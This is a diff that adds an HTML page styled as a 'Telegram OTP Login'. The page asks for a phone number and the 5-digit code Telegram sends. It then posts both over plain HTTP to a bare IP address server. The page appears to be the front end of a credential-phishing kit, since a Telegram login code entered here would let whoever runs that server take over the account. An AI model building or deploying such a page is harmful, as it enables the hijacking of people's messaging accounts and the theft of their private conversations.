@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram OTP Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+        <h1 class="text-2xl font-bold mb-6 text-center">Telegram OTP Login</h1>
+        <div id="phone-form" class="space-y-4">
+            <div>
+                <label for="phone" class="block text-sm font-medium text-gray-700">Phone Number (with country code, e.g., +1234567890)</label>
+                <input type="text" id="phone" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500" placeholder="+1234567890">
+            </div>
+            <button id="send-otp" class="w-full bg-indigo-600 text-white py-2 px-4 rounded-md hover:bg-indigo-700">Send OTP</button>
+        </div>
+        <div id="otp-form" class="space-y-4 hidden">
+            <div>
+                <label for="otp" class="block text-sm font-medium text-gray-700">Enter OTP</label>
+                <input type="text" id="otp" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500" placeholder="Enter OTP">
+            </div>
+            <button id="submit-otp" class="w-full bg-indigo-600 text-white py-2 px-4 rounded-md hover:bg-indigo-700">Submit OTP</button>
+        </div>
+        <div id="message" class="mt-4 text-center text-sm text-gray-600"></div>
+    </div>
+    <script>
+        async function sendRequest(url, data) {
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (error) {
+                return { error: 'Network error: ' + error.message };
+            }
+        }
+
+        document.getElementById('send-otp').addEventListener('click', async () => {
+            const phone = document.getElementById('phone').value;
+            if (!phone.match(/^\+\d{10,15}$/)) {
+                document.getElementById('message').innerText = 'Please enter a valid phone number with country code.';
+                return;
+            }
+            document.getElementById('message').innerText = 'Sending OTP...';
+            const result = await sendRequest('http://13.229.129.164:5000/send_otp', { phone });
+            if (result.error) {
+                document.getElementById('message').innerText = result.error;
+            } else {
+                document.getElementById('phone-form').classList.add('hidden');
+                document.getElementById('otp-form').classList.remove('hidden');
+                document.getElementById('message').innerText = 'OTP sent! Please check your Telegram app.';
+            }
+        });
+
+        document.getElementById('submit-otp').addEventListener('click', async () => {
+            const phone = document.getElementById('phone').value;
+            const otp = document.getElementById('otp').value;
+            if (!otp.match(/^\d{5}$/)) {
+                document.getElementById('message').innerText = 'Please enter a valid 5-digit OTP.';
+                return;
+            }
+            document.getElementById('message').innerText = 'Verifying OTP...';
+            const result = await sendRequest('http://13.229.129.164:5000/verify_otp', { phone, otp });
+            document.getElementById('message').innerText = result.message || result.error;
+            if (!result.error) {
+                document.getElementById('otp-form').classList.add('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
